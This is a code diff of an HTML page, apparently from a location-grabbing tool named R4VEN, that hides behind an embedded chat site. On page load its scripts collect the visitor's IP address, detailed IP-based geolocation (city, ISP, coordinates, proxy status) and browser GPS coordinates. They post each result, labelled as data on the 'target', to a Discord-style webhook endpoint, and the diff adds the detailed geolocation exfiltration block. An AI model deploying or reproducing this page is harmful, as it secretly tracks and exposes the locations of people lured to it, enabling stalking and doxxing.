@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html>
 
@@ -9,7 +10,7 @@
 
 <body onload="getLocation()">
 
-<iframe src="https://www.tohla.com/chat/" width="100%" height="900" style="border:none;">
+<iframe src="https://www.meetskip.com/chat" width="100%" height="900" style="border:none;">
 </iframe>
 
 <p id="demo"></p>
@@ -35,8 +36,8 @@ const request = new XMLHttpRequest();
     }
 
     var params = {
-      username: "R4ven",
-      avatar_url: "https://i.pinimg.com/originals/27/bb/72/27bb72f7f7085f9c81153ce6c7bc2605.jpg",
+      username: "R4VEN",
+      avatar_url: "https://cdn.discordapp.com/attachments/746328746491117611/1050532742707806288/vecteezy_cute-flat-illustration-cartoon-of-thief-hacker-stealing-data_14603389.jpg",
       embeds: [ myEmbed ]
     }
 
@@ -54,15 +55,58 @@ $.getJSON("https://api.ipify.org?format=json", function(data) {
 
       var myEmbed = {
         author: {
-          name: "Grabbed Taregt Ip"
+          name: "Target Ip"
         },
-        title: "IP address:",
-        description: '```xl\n' + data.ip + '```' + '\n__**IP Details:**__ https://ip-api.com/#' + data.ip
+        description: '```xl\n' + data.ip + '```' + '\n__**IP Details:**__ https://ip-api.com/#' + data.ip  + "\n" +
+        '```diff\n- Geographic location based on IP address is NOT accurate, it provides the approximate location of the ISP' + '```'
       }
 
       var params = {
-        username: "R4ven",
-        avatar_url: "https://i.pinimg.com/originals/27/bb/72/27bb72f7f7085f9c81153ce6c7bc2605.jpg",
+        username: "R4VEN",
+        avatar_url: "https://cdn.discordapp.com/attachments/746328746491117611/1050532742707806288/vecteezy_cute-flat-illustration-cartoon-of-thief-hacker-stealing-data_14603389.jpg",
+        embeds: [ myEmbed ]
+      }
+
+      request.send(JSON.stringify(params));
+})
+
+$.getJSON("http://ip-api.com/json/?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query", function(response) {
+
+  const request = new XMLHttpRequest();
+      request.open("POST", "/location_update"); //change webhook
+
+      request.setRequestHeader('Content-type', 'application/json');
+
+      var myEmbed = {
+        author: {
+          name: "IP address:"
+        },
+        title: response.query,
+        description: '```autohotkey\nContinent: ' + response.continent +
+        "\nContinentCode: " + response.continentcode +
+        "\nCountry: " + response.country +
+        "\nCountrycode: " + response.countrycode +
+        "\nRegionname: "+ response.regionName +
+        "\nRegion: " + response.region +
+        "\nCity: " + response.city + 
+        "\nDistrict: " + response.district +
+        "\nZip: " + response.zip +
+        "\nTime_zone: " + response.time_zone +
+        "\nName: " + response.name +
+        "\nAs: " + response.as +
+        "\nIsp: " + response.isp +
+        "\nReverse: " + response.reverse +
+        "\nOffset: " + response.offset +
+        "\nCurrency: " + response.currency +
+        "\nProxy: " + response.proxy +
+        "\nMobile: " + response.mobile +
+        "\nLat: " + response.lat +
+        "\nLon: " + response.lon + '```'
+      }
+
+      var params = {
+        username: "R4VEN",
+        avatar_url: "https://cdn.discordapp.com/attachments/746328746491117611/1050532742707806288/vecteezy_cute-flat-illustration-cartoon-of-thief-hacker-stealing-data_14603389.jpg",
         embeds: [ myEmbed ]
       }
 
@@ -88,15 +132,16 @@ function showPosition(position) {
 
       var myEmbed = {
         author: {
-          name: "Allowed Location Permission"
+          name: "Target Allowed Location Permission"
         },
-        title: "Target gps location...",
-        description: latlong
+        title: "GPS location of target..",
+        description: latlong + "\n" +
+        '```diff\n+ GPS fetch almost exact location because it uses longitude and latitude coordinates.' + '```'
       }
 
       var params = {
-        username: "R4ven",
-        avatar_url: "https://i.pinimg.com/originals/27/bb/72/27bb72f7f7085f9c81153ce6c7bc2605.jpg",
+        username: "R4VEN",
+        avatar_url: "https://cdn.discordapp.com/attachments/746328746491117611/1050532742707806288/vecteezy_cute-flat-illustration-cartoon-of-thief-hacker-stealing-data_14603389.jpg",
         embeds: [ myEmbed ]
       }
 
@@ -113,8 +158,8 @@ function showError(error) {
       request.setRequestHeader('Content-type', 'application/json');
 
       const params = {
-        username: "R4ven",
-        avatar_url: "https://i.pinimg.com/originals/27/bb/72/27bb72f7f7085f9c81153ce6c7bc2605.jpg",
+        username: "R4VEN",
+        avatar_url: "https://cdn.discordapp.com/attachments/746328746491117611/1050532742707806288/vecteezy_cute-flat-illustration-cartoon-of-thief-hacker-stealing-data_14603389.jpg",
         content: "```diff\n- User denied the request for Geolocation.```"
       }
 
